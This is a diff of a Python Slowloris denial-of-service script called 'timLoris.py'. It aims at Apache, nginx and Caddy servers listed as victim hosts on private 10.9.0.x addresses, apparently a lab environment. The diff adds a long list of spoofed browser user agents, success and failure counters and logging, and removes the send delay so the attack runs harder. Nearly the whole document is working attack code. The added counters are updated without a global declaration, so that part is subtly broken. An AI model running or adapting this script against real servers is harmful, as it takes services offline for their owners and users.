@@ -1,9 +1,35 @@
 import socket, random, sys, time
 
 sockets = []
+success = 0
+failed = 0
+log = False
 user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6)...Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
 victim_hosts = {"apache":"10.9.0.5", "nginx":"10.9.0.8", "caddy":"10.9.0.9"}
@@ -18,7 +44,7 @@ def create_socket(IP, port):
     s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
     return s
 
-def slowloris(victim_type, port, socket_count):
+def slowloris(victim_type, port, socket_count, log):
     IP = victim_hosts[victim_type]
     try:
         while True:
@@ -34,17 +60,27 @@ def slowloris(victim_type, port, socket_count):
             for s in sockets[:]:
                 try:
                     s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
+                    success += 1
+                    if log:
+                        print("Successfully sent data")
                 except Exception as e:
+                    failed +=1
+                    if log:
+                        print(f"Socket removed: {e}")
                     sockets.remove(s)
-            time.sleep(1) # Increase header sending frequency significantly
+            #time.sleep(1) # Increase header sending frequency significantly
 
     except KeyboardInterrupt:
+        print(f"Successes: {success} \nFailures: {failed}")
         print("Attack stopped by user.")
 
 if __name__ == "__main__":
-    if len(sys.argv) != 4 or sys.argv[1] not in victim_hosts:
+    if len(sys.argv) != 5 or sys.argv[1] not in victim_hosts:
         print("Usage: python timLoris.py <apache|nginx|caddy> <Port> <Socket Count>")
         sys.exit(1)
+        
+    if sys.argv[4] == "log":
+        log = True
 
-    slowloris(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+    slowloris(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), log)
 
